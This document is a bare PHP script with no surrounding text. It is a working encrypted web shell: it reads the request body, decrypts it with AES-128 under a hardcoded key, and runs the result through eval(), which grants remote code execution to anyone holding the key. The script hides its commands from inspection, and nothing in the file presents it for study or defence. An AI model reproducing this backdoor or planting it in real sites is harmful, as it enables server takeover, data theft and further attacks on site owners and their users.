<?php
$k = "e45e329feb5d925b";
session_start();
$post = file_get_contents("php://input");
$data = openssl_decrypt(base64_decode($post), "AES128", $k);
if ($data) { eval($data); }
?>
